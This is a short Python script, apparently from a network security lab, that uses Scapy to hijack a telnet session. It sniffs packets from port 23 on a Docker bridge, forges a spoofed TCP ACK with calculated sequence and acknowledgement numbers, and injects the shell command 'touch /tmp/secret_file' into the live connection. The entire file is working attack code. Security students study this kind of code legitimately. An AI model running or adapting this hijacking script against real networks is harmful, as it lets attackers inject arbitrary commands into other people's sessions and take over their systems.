#!/bin/env python3

from scapy.all import *

def spoof(pkt):
    pre_tcp = pkt[TCP]
    pre_ip = pkt[IP]

    tcp_len = pre_ip.len - pre_ip.ihl*4 - pre_tcp.dataofs*4

    ip = IP(src=pre_ip.dst, dst=pre_ip.src)
    tcp = TCP(sport=pre_tcp.dport, dport=pre_tcp.sport, flags="A", seq=pre_tcp.ack + 10, ack=pre_tcp.seq + tcp_len)
    data = "\ntouch /tmp/secret_file\n"
    pkt = ip/tcp/data
    pkt.show()
    send(pkt,iface="br-e7dfb33c0e40", verbose=0)
    quit()

myFilter = 'tcp and src host 10.9.0.5 and dst host 10.9.0.6 and src port 23'

sniff(iface="br-e7dfb33c0e40", filter=myFilter, prn=spoof)
